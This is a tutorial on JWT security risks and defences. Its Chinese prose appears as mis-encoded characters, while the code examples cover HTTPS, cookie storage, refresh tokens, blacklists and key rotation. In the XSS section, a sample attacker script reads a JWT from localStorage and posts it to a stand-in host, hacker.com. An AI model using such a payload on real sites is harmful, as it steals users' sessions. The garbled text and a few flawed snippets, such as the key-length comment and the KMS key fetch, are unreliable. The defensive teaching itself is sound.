---
title: 9ã€JWTå®‰å…¨é£é™©ä¸é˜²æŠ¤
---
## ğŸ“š ç›®å½•

1. [JWTå®‰å…¨é£é™©æ¦‚è¿°](#1-JWTå®‰å…¨é£é™©æ¦‚è¿°)
2. [Tokenæ³„éœ²é£é™©ä¸é˜²æŠ¤](#2-Tokenæ³„éœ²é£é™©ä¸é˜²æŠ¤)
3. [é‡æ”¾æ”»å‡»ä¸é˜²èŒƒæªæ–½](#3-é‡æ”¾æ”»å‡»ä¸é˜²èŒƒæªæ–½)
4. [Tokenå¤±æ•ˆä¸æå‰ä½œåºŸ](#4-Tokenå¤±æ•ˆä¸æå‰ä½œåºŸ)
5. [å¯†é’¥ç®¡ç†ä¸è½®æ¢ç­–ç•¥](#5-å¯†é’¥ç®¡ç†ä¸è½®æ¢ç­–ç•¥)
6. [HTTPSä¼ è¾“å®‰å…¨](#6-HTTPSä¼ è¾“å®‰å…¨)
7. [è½½è·æ•°æ®å®‰å…¨åŸåˆ™](#7-è½½è·æ•°æ®å®‰å…¨åŸåˆ™)
8. [JWTåŠ«æŒé˜²æŠ¤æªæ–½](#8-JWTåŠ«æŒé˜²æŠ¤æªæ–½)
9. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#9-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ›¡ï¸ JWTå®‰å…¨é£é™©æ¦‚è¿°


### 1.1 JWTä¸ºä»€ä¹ˆä¼šæœ‰å®‰å…¨é£é™©


**JWTçš„å¤©ç”Ÿç‰¹ç‚¹**å†³å®šäº†å®ƒçš„å®‰å…¨é£é™©ï¼š

```
JWTç»“æ„ç‰¹ç‚¹ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Header     â”‚.â”‚    Payload     â”‚.â”‚  Signature  â”‚
â”‚   (å…¬å¼€)     â”‚  â”‚   (å¯è§£ç )     â”‚  â”‚   (ç­¾å)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

> ğŸ’¡ **å…³é”®ç†è§£**ï¼šJWTä¸æ˜¯åŠ å¯†çš„ï¼Œè€Œæ˜¯**ç­¾å**çš„ï¼ä»»ä½•äººéƒ½å¯ä»¥è§£ç æŸ¥çœ‹å†…å®¹ï¼Œç­¾ååªæ˜¯ç”¨æ¥éªŒè¯**å®Œæ•´æ€§**

### 1.2 ä¸»è¦å®‰å…¨é£é™©åˆ†ç±»


| é£é™©ç±»å‹ | **ä¸¥é‡ç¨‹åº¦** | **å½±å“èŒƒå›´** | **é˜²æŠ¤éš¾åº¦** |
|---------|-------------|-------------|-------------|
| ğŸ”“ **Tokenæ³„éœ²** | `é«˜` | `èº«ä»½å†’å……` | `ä¸­ç­‰` |
| ğŸ”„ **é‡æ”¾æ”»å‡»** | `ä¸­` | `æœªæˆæƒæ“ä½œ` | `ç®€å•` |
| â° **Tokenæ»¥ç”¨** | `é«˜` | `é•¿æœŸé£é™©` | `ä¸­ç­‰` |
| ğŸ”‘ **å¯†é’¥æ³„éœ²** | `æé«˜` | `ç³»ç»Ÿæ€§é£é™©` | `å›°éš¾` |
| ğŸ“¦ **ä¿¡æ¯æ³„éœ²** | `ä¸­` | `éšç§é£é™©` | `ç®€å•` |

---

## 2. ğŸ”“ Tokenæ³„éœ²é£é™©ä¸é˜²æŠ¤


### 2.1 Tokenæ³„éœ²çš„å¸¸è§é€”å¾„


#### ğŸ“¡ ç½‘ç»œæŠ“åŒ…æ³„éœ²


**é£é™©åœºæ™¯**ï¼š
```
ç”¨æˆ·è®¾å¤‡ â”€â”€HTTPâ”€â”€â†’ ä¸­é—´äºº â”€â”€HTTPâ”€â”€â†’ æœåŠ¡å™¨
           â†‘                    â†‘
      Tokenè¢«æˆªè·          Tokenè¢«è®°å½•
```

> âš ï¸ **å±é™©æƒ…å†µ**ï¼šåœ¨å’–å•¡å…ã€é…’åº—ç­‰å…¬å…±WiFiç¯å¢ƒä¸‹ï¼ŒHTTPä¼ è¾“çš„JWTå¾ˆå®¹æ˜“è¢«æŠ“åŒ…è·å–

**é˜²æŠ¤æªæ–½**ï¼š
```javascript
// âŒ å±é™©åšæ³•ï¼šHTTPä¼ è¾“
fetch('http://api.example.com/user', {
    headers: {
        'Authorization': 'Bearer ' + token
    }
});

// âœ… å®‰å…¨åšæ³•ï¼šå¼ºåˆ¶HTTPS
fetch('https://api.example.com/user', {
    headers: {
        'Authorization': 'Bearer ' + token
    }
});
```

#### ğŸ•·ï¸ XSSæ”»å‡»æ³„éœ²


**æ”»å‡»åŸç†**ï¼šæ¶æ„è„šæœ¬è¯»å–æœ¬åœ°å­˜å‚¨çš„Token

```javascript
// æ”»å‡»è€…æ³¨å…¥çš„æ¶æ„ä»£ç 
<script>
// å·å–localStorageä¸­çš„token
var token = localStorage.getItem('jwt_token');
// å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨
fetch('https://hacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({token: token})
});
</script>
```

**é˜²æŠ¤ç­–ç•¥**ï¼š

```javascript
// âŒ é«˜é£é™©ï¼šå­˜å‚¨åœ¨localStorage
localStorage.setItem('jwt_token', token);

// âœ… ç›¸å¯¹å®‰å…¨ï¼šå­˜å‚¨åœ¨httpOnly cookie
// æœåŠ¡ç«¯è®¾ç½®cookie
response.cookie('jwt_token', token, {
    httpOnly: true,    // é˜²æ­¢JSè®¿é—®
    secure: true,      // ä»…HTTPSä¼ è¾“
    sameSite: 'strict' // é˜²æ­¢CSRF
});

// âœ… æœ€å®‰å…¨ï¼šå­˜å‚¨åœ¨å†…å­˜ä¸­
class TokenManager {
    constructor() {
        this.token = null;  // ä»…å­˜åœ¨å†…å­˜ä¸­
    }
    
    setToken(token) {
        this.token = token;
        // é¡µé¢åˆ·æ–°ä¼šä¸¢å¤±ï¼Œéœ€è¦é‡æ–°ç™»å½•
    }
}
```

### 2.2 å®¢æˆ·ç«¯å­˜å‚¨å®‰å…¨å¯¹æ¯”


| å­˜å‚¨æ–¹å¼ | **XSSé£é™©** | **CSRFé£é™©** | **åˆ·æ–°ä¸¢å¤±** | **æ¨èåº¦** |
|---------|------------|-------------|-------------|-----------|
| `localStorage` | `é«˜` | `ä½` | `å¦` | `âŒ ä¸æ¨è` |
| `sessionStorage` | `é«˜` | `ä½` | `æ˜¯` | `âš ï¸ è°¨æ…ä½¿ç”¨` |
| `httpOnly Cookie` | `ä½` | `ä¸­` | `å¦` | `âœ… æ¨è` |
| `å†…å­˜å­˜å‚¨` | `ä½` | `ä½` | `æ˜¯` | `âœ… æœ€å®‰å…¨` |

---

## 3. ğŸ”„ é‡æ”¾æ”»å‡»ä¸é˜²èŒƒæªæ–½


### 3.1 ä»€ä¹ˆæ˜¯é‡æ”¾æ”»å‡»


**æ”»å‡»åœºæ™¯**ï¼šæ”»å‡»è€…æˆªè·æœ‰æ•ˆçš„JWT Tokenï¼Œç„¶ååå¤ä½¿ç”¨è¿™ä¸ªTokenè¿›è¡Œæ¶æ„æ“ä½œ

```
æ­£å¸¸æµç¨‹ï¼š
ç”¨æˆ· â”€â”€ç™»å½•â”€â”€â†’ æœåŠ¡å™¨ â”€â”€è¿”å›JWTâ”€â”€â†’ ç”¨æˆ· â”€â”€ä½¿ç”¨JWTâ”€â”€â†’ æœåŠ¡å™¨

é‡æ”¾æ”»å‡»ï¼š
æ”»å‡»è€… â”€â”€æˆªè·JWTâ”€â”€â†’ æ”»å‡»è€… â”€â”€é‡å¤ä½¿ç”¨JWTâ”€â”€â†’ æœåŠ¡å™¨
                                  â†‘
                           æœåŠ¡å™¨æ— æ³•åŒºåˆ†æ˜¯å¦ä¸ºæ¶æ„ä½¿ç”¨
```

### 3.2 é˜²èŒƒé‡æ”¾æ”»å‡»çš„æ–¹æ³•


#### â° è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´


```javascript
// JWTç”Ÿæˆæ—¶è®¾ç½®è¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´
const payload = {
    userId: 123,
    username: 'john',
    exp: Math.floor(Date.now() / 1000) + (15 * 60)  // 15åˆ†é’Ÿåè¿‡æœŸ
};

const token = jwt.sign(payload, secretKey);
```

> ğŸ’¡ **å¹³è¡¡åŸåˆ™**ï¼šè¿‡æœŸæ—¶é—´å¤ªé•¿é£é™©å¤§ï¼Œå¤ªçŸ­ç”¨æˆ·ä½“éªŒå·®ã€‚å»ºè®®ï¼š`15-30åˆ†é’Ÿ`

#### ğŸ”„ å®ç°Tokenåˆ·æ–°æœºåˆ¶


```javascript
// åŒTokenç­–ç•¥
const generateTokens = (userId) => {
    // è®¿é—®Tokenï¼šçŸ­æœŸæœ‰æ•ˆï¼ˆ15åˆ†é’Ÿï¼‰
    const accessToken = jwt.sign(
        { userId, type: 'access' }, 
        secretKey, 
        { expiresIn: '15m' }
    );
    
    // åˆ·æ–°Tokenï¼šé•¿æœŸæœ‰æ•ˆï¼ˆ7å¤©ï¼‰
    const refreshToken = jwt.sign(
        { userId, type: 'refresh' }, 
        refreshSecretKey, 
        { expiresIn: '7d' }
    );
    
    return { accessToken, refreshToken };
};

// Tokenåˆ·æ–°æ¥å£
app.post('/refresh', (req, res) => {
    const { refreshToken } = req.body;
    
    try {
        const decoded = jwt.verify(refreshToken, refreshSecretKey);
        if (decoded.type !== 'refresh') {
            throw new Error('Invalid token type');
        }
        
        // ç”Ÿæˆæ–°çš„è®¿é—®Token
        const newAccessToken = jwt.sign(
            { userId: decoded.userId, type: 'access' },
            secretKey,
            { expiresIn: '15m' }
        );
        
        res.json({ accessToken: newAccessToken });
    } catch (error) {
        res.status(401).json({ error: 'Invalid refresh token' });
    }
});
```

#### ğŸ†” æ·»åŠ å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆJTIï¼‰


```javascript
// ç”ŸæˆTokenæ—¶æ·»åŠ å”¯ä¸€ID
const payload = {
    userId: 123,
    jti: generateUniqueId(),  // JWT IDï¼Œæ¯ä¸ªtokenå”¯ä¸€
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (15 * 60)
};

// æœåŠ¡ç«¯è®°å½•å·²ä½¿ç”¨çš„JTIï¼ˆä½¿ç”¨Redisç­‰ç¼“å­˜ï¼‰
const usedTokens = new Set();

// éªŒè¯Tokenæ—¶æ£€æŸ¥JTI
const verifyToken = (token) => {
    const decoded = jwt.verify(token, secretKey);
    
    if (usedTokens.has(decoded.jti)) {
        throw new Error('Token already used');
    }
    
    // æ ‡è®°ä¸ºå·²ä½¿ç”¨ï¼ˆæ ¹æ®ä¸šåŠ¡éœ€æ±‚ï¼‰
    usedTokens.add(decoded.jti);
    
    return decoded;
};
```

---

## 4. â° Tokenå¤±æ•ˆä¸æå‰ä½œåºŸ


### 4.1 ä¸ºä»€ä¹ˆéœ€è¦æå‰ä½œåºŸToken


**å¸¸è§åœºæ™¯**ï¼š
- ğŸš¨ ç”¨æˆ·ä¸»åŠ¨é€€å‡ºç™»å½•
- ğŸ”’ è´¦æˆ·è¢«é”å®šæˆ–ç¦ç”¨  
- ğŸ›¡ï¸ æ£€æµ‹åˆ°å®‰å…¨å¨èƒ
- ğŸ“± ç”¨æˆ·æ›´æ¢è®¾å¤‡è¦æ±‚å…¶ä»–è®¾å¤‡ä¸‹çº¿

### 4.2 Tokené»‘åå•æœºåˆ¶


```javascript
// Rediså®ç°Tokené»‘åå•
const redis = require('redis');
const client = redis.createClient();

class TokenBlacklist {
    // å°†tokenåŠ å…¥é»‘åå•
    static async addToBlacklist(token) {
        try {
            const decoded = jwt.decode(token);
            const remainingTime = decoded.exp - Math.floor(Date.now() / 1000);
            
            if (remainingTime > 0) {
                // åœ¨Redisä¸­å­˜å‚¨ï¼Œè¿‡æœŸæ—¶é—´ä¸ºtokenå‰©ä½™æœ‰æ•ˆæ—¶é—´
                await client.setex(`blacklist:${decoded.jti}`, remainingTime, 'true');
            }
        } catch (error) {
            console.error('Failed to blacklist token:', error);
        }
    }
    
    // æ£€æŸ¥tokenæ˜¯å¦åœ¨é»‘åå•ä¸­
    static async isBlacklisted(token) {
        try {
            const decoded = jwt.decode(token);
            const result = await client.get(`blacklist:${decoded.jti}`);
            return result === 'true';
        } catch (error) {
            return false;
        }
    }
}

// éªŒè¯ä¸­é—´ä»¶
const verifyTokenWithBlacklist = async (req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }
    
    try {
        // 1. æ£€æŸ¥æ˜¯å¦åœ¨é»‘åå•ä¸­
        if (await TokenBlacklist.isBlacklisted(token)) {
            return res.status(401).json({ error: 'Token has been revoked' });
        }
        
        // 2. éªŒè¯JWTç­¾åå’Œè¿‡æœŸæ—¶é—´
        const decoded = jwt.verify(token, secretKey);
        req.user = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Invalid token' });
    }
};
```

### 4.3 ç”¨æˆ·é€€å‡ºç™»å½•å®ç°


```javascript
// ç”¨æˆ·é€€å‡ºæ¥å£
app.post('/logout', verifyTokenWithBlacklist, async (req, res) => {
    const token = req.headers.authorization.replace('Bearer ', '');
    
    // å°†å½“å‰tokenåŠ å…¥é»‘åå•
    await TokenBlacklist.addToBlacklist(token);
    
    res.json({ message: 'é€€å‡ºç™»å½•æˆåŠŸ' });
});

// å…¨è®¾å¤‡é€€å‡ºï¼ˆè®©ç”¨æˆ·æ‰€æœ‰è®¾å¤‡çš„tokenå¤±æ•ˆï¼‰
app.post('/logout-all', verifyTokenWithBlacklist, async (req, res) => {
    const userId = req.user.userId;
    
    // æ›´æ–°ç”¨æˆ·çš„tokenç‰ˆæœ¬å·ï¼Œä½¿æ‰€æœ‰æ—§tokenå¤±æ•ˆ
    await User.updateTokenVersion(userId);
    
    res.json({ message: 'æ‰€æœ‰è®¾å¤‡å·²é€€å‡ºç™»å½•' });
});
```

---

## 5. ğŸ”‘ å¯†é’¥ç®¡ç†ä¸è½®æ¢ç­–ç•¥


### 5.1 å¯†é’¥æ³„éœ²çš„å±å®³


**ä¸€æ—¦å¯†é’¥æ³„éœ²**ï¼š
```
æ”»å‡»è€…è·å¾—å¯†é’¥
    â†“
å¯ä»¥ä¼ªé€ ä»»ä½•ç”¨æˆ·çš„JWT
    â†“  
å®Œå…¨ç»•è¿‡èº«ä»½éªŒè¯
    â†“
è·å¾—ç³»ç»Ÿå®Œå…¨æ§åˆ¶æƒ
```

> ğŸš¨ **ä¸¥é‡æ€§**ï¼šå¯†é’¥æ³„éœ²æ˜¯JWTå®‰å…¨çš„æœ€å¤§å¨èƒï¼Œå½±å“æ•´ä¸ªç³»ç»Ÿå®‰å…¨

### 5.2 å¯†é’¥ç®¡ç†æœ€ä½³å®è·µ


#### ğŸ” å¯†é’¥å¼ºåº¦è¦æ±‚


```javascript
// âŒ å¼±å¯†é’¥
const weakSecret = 'secret123';

// âœ… å¼ºå¯†é’¥
const crypto = require('crypto');
const strongSecret = crypto.randomBytes(64).toString('hex');
// ç”Ÿæˆ128ä½éšæœºå¯†é’¥

// âœ… ç¯å¢ƒå˜é‡å­˜å‚¨
// .envæ–‡ä»¶
JWT_SECRET=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6
JWT_REFRESH_SECRET=z6y5x4w3v2u1t0s9r8q7p6o5n4m3l2k1j0i9h8g7f6e5d4c3b2a1

// Node.jsä¸­ä½¿ç”¨
const secretKey = process.env.JWT_SECRET;
if (!secretKey) {
    throw new Error('JWT_SECRET environment variable is required');
}
```

#### ğŸ”„ å¯†é’¥è½®æ¢ç­–ç•¥


```javascript
class KeyRotationManager {
    constructor() {
        this.currentKey = process.env.JWT_SECRET;
        this.previousKeys = JSON.parse(process.env.JWT_PREVIOUS_KEYS || '[]');
    }
    
    // è½®æ¢å¯†é’¥
    rotateKey() {
        // ç”Ÿæˆæ–°å¯†é’¥
        const newKey = crypto.randomBytes(64).toString('hex');
        
        // ä¿å­˜æ—§å¯†é’¥ï¼ˆç”¨äºéªŒè¯æ—§tokenï¼‰
        this.previousKeys.push(this.currentKey);
        
        // åªä¿ç•™æœ€è¿‘3ä¸ªå¯†é’¥
        if (this.previousKeys.length > 3) {
            this.previousKeys.shift();
        }
        
        // æ›´æ–°å½“å‰å¯†é’¥
        this.currentKey = newKey;
        
        console.log('å¯†é’¥è½®æ¢å®Œæˆ');
    }
    
    // ä½¿ç”¨å½“å‰å¯†é’¥ç­¾å
    signToken(payload) {
        return jwt.sign(payload, this.currentKey);
    }
    
    // å°è¯•æ‰€æœ‰å¯†é’¥éªŒè¯token
    verifyToken(token) {
        // å…ˆå°è¯•å½“å‰å¯†é’¥
        try {
            return jwt.verify(token, this.currentKey);
        } catch (error) {
            // å°è¯•æ—§å¯†é’¥
            for (const oldKey of this.previousKeys) {
                try {
                    return jwt.verify(token, oldKey);
                } catch (e) {
                    continue;
                }
            }
            throw new Error('Invalid token');
        }
    }
}

// å®šæœŸè½®æ¢å¯†é’¥ï¼ˆä¾‹å¦‚æ¯æœˆä¸€æ¬¡ï¼‰
const keyManager = new KeyRotationManager();
setInterval(() => {
    keyManager.rotateKey();
}, 30 * 24 * 60 * 60 * 1000); // 30å¤©
```

### 5.3 å¯†é’¥å­˜å‚¨å®‰å…¨


```javascript
// âœ… ä½¿ç”¨ä¸“ä¸šçš„å¯†é’¥ç®¡ç†æœåŠ¡
const aws = require('aws-sdk');
const kms = new aws.KMS();

class SecureKeyManager {
    // ä»AWS KMSè·å–å¯†é’¥
    async getSecret() {
        const params = {
            KeyId: 'alias/jwt-signing-key'
        };
        
        const result = await kms.generateDataKey(params).promise();
        return result.Plaintext;
    }
}

// âœ… æˆ–ä½¿ç”¨HashiCorp Vault
const vault = require('node-vault')({
    endpoint: 'https://vault.company.com',
    token: process.env.VAULT_TOKEN
});

const getJWTSecret = async () => {
    const result = await vault.read('secret/jwt');
    return result.data.signing_key;
};
```

---

## 6. ğŸ”’ HTTPSä¼ è¾“å®‰å…¨


### 6.1 ä¸ºä»€ä¹ˆHTTPSå¯¹JWTè‡³å…³é‡è¦


**HTTPä¼ è¾“çš„é£é™©**ï¼š
```
å®¢æˆ·ç«¯ â”€â”€JWTä»¤ç‰Œâ”€â”€â†’ ç½‘ç»œ(æ˜æ–‡) â”€â”€JWTä»¤ç‰Œâ”€â”€â†’ æœåŠ¡å™¨
              â†‘
          ä¸­é—´äººå¯ä»¥ç›´æ¥è¯»å–JWT
```

**HTTPSä¼ è¾“çš„ä¿æŠ¤**ï¼š
```
å®¢æˆ·ç«¯ â”€â”€åŠ å¯†JWTâ”€â”€â†’ TLSåŠ å¯†é€šé“ â”€â”€åŠ å¯†JWTâ”€â”€â†’ æœåŠ¡å™¨
                â†‘
            ä¸­é—´äººæ— æ³•è§£å¯†å†…å®¹
```

### 6.2 HTTPSé…ç½®è¦ç‚¹


#### ğŸ”§ æœåŠ¡ç«¯å¼ºåˆ¶HTTPS


```javascript
// Express.jså¼ºåˆ¶HTTPS
const requireHTTPS = (req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
        return res.redirect(`https://${req.header('host')}${req.url}`);
    }
    next();
};

app.use(requireHTTPS);

// è®¾ç½®å®‰å…¨å“åº”å¤´
app.use((req, res, next) => {
    // å¼ºåˆ¶HTTPS
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    // é˜²æ­¢å†…å®¹å—…æ¢
    res.setHeader('X-Content-Type-Options', 'nosniff');
    // é˜²æ­¢XSS
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});
```

#### ğŸ“± å®¢æˆ·ç«¯HTTPSéªŒè¯


```javascript
// å®¢æˆ·ç«¯ç¡®ä¿ä½¿ç”¨HTTPS
const apiCall = (endpoint, data) => {
    if (!endpoint.startsWith('https://')) {
        throw new Error('åªå…è®¸HTTPSè¯·æ±‚');
    }
    
    return fetch(endpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${getToken()}`
        },
        body: JSON.stringify(data)
    });
};
```

---

## 7. ğŸ“¦ è½½è·æ•°æ®å®‰å…¨åŸåˆ™


### 7.1 æ•æ„Ÿä¿¡æ¯ä¸æ”¾å…¥JWT


> âš ï¸ **é‡è¦åŸåˆ™**ï¼šJWTçš„payloadæ˜¯**Base64ç¼–ç **ï¼Œä¸æ˜¯åŠ å¯†ï¼ä»»ä½•äººéƒ½å¯ä»¥è§£ç æŸ¥çœ‹

#### âŒ å±é™©çš„åšæ³•


```javascript
// åƒä¸‡ä¸è¦è¿™æ ·åšï¼
const dangerousPayload = {
    userId: 123,
    username: 'john',
    password: 'user123456',        // âŒ ç»å¯¹ä¸èƒ½æ”¾å¯†ç 
    creditCard: '4111-1111-1111-1111',  // âŒ ä¸èƒ½æ”¾ä¿¡ç”¨å¡å·
    ssn: '123-45-6789',           // âŒ ä¸èƒ½æ”¾èº«ä»½è¯å·
    salary: 50000,                // âŒ ä¸èƒ½æ”¾è–ªèµ„ä¿¡æ¯
    email: 'john@example.com'     // âš ï¸ é‚®ç®±è¦è°¨æ…
};
```

#### âœ… å®‰å…¨çš„åšæ³•


```javascript
// åªåŒ…å«å¿…è¦çš„éæ•æ„Ÿä¿¡æ¯
const safePayload = {
    userId: 123,                  // âœ… ç”¨æˆ·IDï¼ˆé€šå¸¸å®‰å…¨ï¼‰
    username: 'john',             // âœ… ç”¨æˆ·åï¼ˆå…¬å¼€ä¿¡æ¯ï¼‰
    role: 'user',                 // âœ… è§’è‰²ä¿¡æ¯
    permissions: ['read', 'write'], // âœ… æƒé™ä¿¡æ¯
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600
};

const token = jwt.sign(safePayload, secretKey);
```

### 7.2 æ•°æ®æœ€å°åŒ–åŸåˆ™


```javascript
// æ ¹æ®ä¸åŒåœºæ™¯åŒ…å«ä¸åŒä¿¡æ¯
class JWTPayloadBuilder {
    static buildForAPI(user) {
        return {
            userId: user.id,
            role: user.role,
            exp: Math.floor(Date.now() / 1000) + (15 * 60)  // 15åˆ†é’Ÿ
        };
    }
    
    static buildForSSO(user) {
        return {
            userId: user.id,
            username: user.username,
            email: user.email,  // SSOåœºæ™¯å¯èƒ½éœ€è¦
            exp: Math.floor(Date.now() / 1000) + (8 * 60 * 60)  // 8å°æ—¶
        };
    }
    
    static buildForMobile(user) {
        return {
            userId: user.id,
            deviceId: user.currentDevice,
            exp: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60)  // 7å¤©
        };
    }
}
```

### 7.3 æ•æ„Ÿæ•°æ®çš„æ­£ç¡®å¤„ç†


```javascript
// æ•æ„Ÿæ•°æ®åº”è¯¥é€šè¿‡APIè°ƒç”¨è·å–
app.get('/user/profile', verifyToken, async (req, res) => {
    const userId = req.user.userId;  // ä»JWTè·å–ç”¨æˆ·ID
    
    // ä»æ•°æ®åº“æŸ¥è¯¢å®Œæ•´ç”¨æˆ·ä¿¡æ¯
    const userProfile = await User.findById(userId, {
        // åªè¿”å›å…è®¸çš„å­—æ®µ
        select: 'username email avatar createdAt -password'
    });
    
    res.json(userProfile);
});

// å‰ç«¯è·å–ç”¨æˆ·ä¿¡æ¯
const getUserInfo = async () => {
    const token = getStoredToken();
    
    // JWTåªç”¨äºèº«ä»½éªŒè¯ï¼Œè¯¦ç»†ä¿¡æ¯é€šè¿‡APIè·å–
    const response = await fetch('/user/profile', {
        headers: {
            'Authorization': `Bearer ${token}`
        }
    });
    
    return response.json();
};
```

---

## 8. ğŸ›¡ï¸ JWTåŠ«æŒé˜²æŠ¤æªæ–½


### 8.1 ç»¼åˆé˜²æŠ¤ç­–ç•¥


#### ğŸ” æŒ‡çº¹éªŒè¯æœºåˆ¶


```javascript
// ç”Ÿæˆè®¾å¤‡æŒ‡çº¹
const generateDeviceFingerprint = (req) => {
    const components = [
        req.headers['user-agent'],
        req.ip,
        req.headers['accept-language'],
        req.headers['accept-encoding']
    ].join('|');
    
    return crypto.createHash('sha256').update(components).digest('hex');
};

// JWTä¸­åŒ…å«æŒ‡çº¹ä¿¡æ¯
const createTokenWithFingerprint = (userId, req) => {
    const fingerprint = generateDeviceFingerprint(req);
    
    const payload = {
        userId,
        fingerprint,
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 3600
    };
    
    return jwt.sign(payload, secretKey);
};

// éªŒè¯æ—¶æ£€æŸ¥æŒ‡çº¹
const verifyTokenWithFingerprint = (req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    try {
        const decoded = jwt.verify(token, secretKey);
        const currentFingerprint = generateDeviceFingerprint(req);
        
        if (decoded.fingerprint !== currentFingerprint) {
            return res.status(401).json({ 
                error: 'Tokenè¢«å¼‚åœ°ä½¿ç”¨ï¼Œè¯·é‡æ–°ç™»å½•' 
            });
        }
        
        req.user = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Invalid token' });
    }
};
```

#### ğŸŒ IPåœ°å€ç»‘å®š


```javascript
class IPBasedSecurity {
    // è®°å½•ç”¨æˆ·çš„å¸¸ç”¨IP
    static async recordUserIP(userId, ip) {
        await redis.sadd(`user:${userId}:ips`, ip);
        await redis.expire(`user:${userId}:ips`, 30 * 24 * 60 * 60); // 30å¤©è¿‡æœŸ
    }
    
    // æ£€æŸ¥IPæ˜¯å¦å¯ä¿¡
    static async isIPTrusted(userId, ip) {
        const trustedIPs = await redis.smembers(`user:${userId}:ips`);
        return trustedIPs.includes(ip);
    }
    
    // å¯ç–‘IPé€šçŸ¥
    static async handleSuspiciousIP(userId, ip) {
        // å‘é€é‚®ä»¶æˆ–çŸ­ä¿¡é€šçŸ¥ç”¨æˆ·
        await NotificationService.send(userId, {
            type: 'security_alert',
            message: `æ£€æµ‹åˆ°æ¥è‡ªæ–°IP ${ip} çš„ç™»å½•ï¼Œå¦‚éæœ¬äººæ“ä½œè¯·ç«‹å³ä¿®æ”¹å¯†ç `
        });
    }
}

// ä½¿ç”¨IPéªŒè¯çš„ä¸­é—´ä»¶
const ipVerificationMiddleware = async (req, res, next) => {
    const decoded = req.user; // å‡è®¾tokenå·²éªŒè¯
    const currentIP = req.ip;
    
    const isTrusted = await IPBasedSecurity.isIPTrusted(decoded.userId, currentIP);
    
    if (!isTrusted) {
        // è®°å½•å¯ç–‘è®¿é—®
        console.warn(`å¯ç–‘IPè®¿é—®: ç”¨æˆ·${decoded.userId} æ¥è‡ªIP ${currentIP}`);
        
        // é€šçŸ¥ç”¨æˆ·
        await IPBasedSecurity.handleSuspiciousIP(decoded.userId, currentIP);
        
        // å¯ä»¥é€‰æ‹©ï¼š1)æ‹’ç»è®¿é—® 2)è¦æ±‚é‡æ–°éªŒè¯ 3)è®°å½•å¹¶å…è®¸
        return res.status(403).json({ 
            error: 'æ£€æµ‹åˆ°å¼‚å¸¸è®¿é—®ï¼Œè¯·é‡æ–°éªŒè¯èº«ä»½' 
        });
    }
    
    next();
};
```

### 8.2 å®æ—¶å®‰å…¨ç›‘æ§


```javascript
class SecurityMonitor {
    // æ£€æµ‹å¼‚å¸¸è®¿é—®æ¨¡å¼
    static async detectAnomalousActivity(userId, req) {
        const key = `activity:${userId}`;
        const current = Date.now();
        
        // è®°å½•è®¿é—®é¢‘ç‡
        await redis.zadd(key, current, `${current}:${req.ip}`);
        await redis.expire(key, 300); // 5åˆ†é’Ÿçª—å£
        
        // æ£€æŸ¥5åˆ†é’Ÿå†…çš„è¯·æ±‚æ•°é‡
        const recentActivity = await redis.zcount(key, current - 300000, current);
        
        if (recentActivity > 100) { // 5åˆ†é’Ÿè¶…è¿‡100æ¬¡è¯·æ±‚
            return {
                suspicious: true,
                reason: 'High frequency requests',
                action: 'rate_limit'
            };
        }
        
        // æ£€æŸ¥å¤šIPè®¿é—®
        const recentIPs = await redis.zrange(key, -10, -1);
        const uniqueIPs = new Set(recentIPs.map(entry => entry.split(':')[1]));
        
        if (uniqueIPs.size > 3) { // çŸ­æ—¶é—´å†…æ¥è‡ªå¤šä¸ªIP
            return {
                suspicious: true,
                reason: 'Multiple IP addresses',
                action: 'require_reauth'
            };
        }
        
        return { suspicious: false };
    }
}
```

---

## 9. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 9.1 å¿…é¡»æŒæ¡çš„å®‰å…¨åŸåˆ™


```
ğŸ”¸ JWTä¸æ˜¯åŠ å¯†ï¼šä»»ä½•äººéƒ½å¯ä»¥è§£ç æŸ¥çœ‹payloadå†…å®¹
ğŸ”¸ HTTPSå¿…é¡»ï¼šHTTPä¼ è¾“JWTç­‰äºè£¸å¥”
ğŸ”¸ æ•æ„Ÿæ•°æ®ç¦æ­¢ï¼šå¯†ç ã€è¯ä»¶å·ç­‰ç»å¯¹ä¸èƒ½æ”¾å…¥JWT
ğŸ”¸ åˆç†è¿‡æœŸï¼š15-30åˆ†é’Ÿè®¿é—®token + é•¿æœŸåˆ·æ–°token
ğŸ”¸ å¯†é’¥ç®¡ç†ï¼šå¼ºå¯†é’¥ + å®šæœŸè½®æ¢ + å®‰å…¨å­˜å‚¨
ğŸ”¸ é»‘åå•æœºåˆ¶ï¼šæ”¯æŒtokenæå‰ä½œåºŸåŠŸèƒ½
```

